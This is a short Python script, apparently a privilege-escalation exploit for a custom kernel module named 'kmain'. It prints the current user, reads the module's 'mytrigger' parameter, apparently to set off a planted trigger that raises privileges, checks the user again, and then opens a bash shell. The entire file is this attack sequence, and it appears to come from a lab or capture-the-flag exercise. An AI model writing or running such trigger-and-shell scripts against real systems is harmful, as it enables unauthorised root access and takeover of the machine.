import os
os.system('whoami')
print(open('/sys/module/kmain/parameters/mytrigger').read())
os.system('whoami')
os.system('bash')
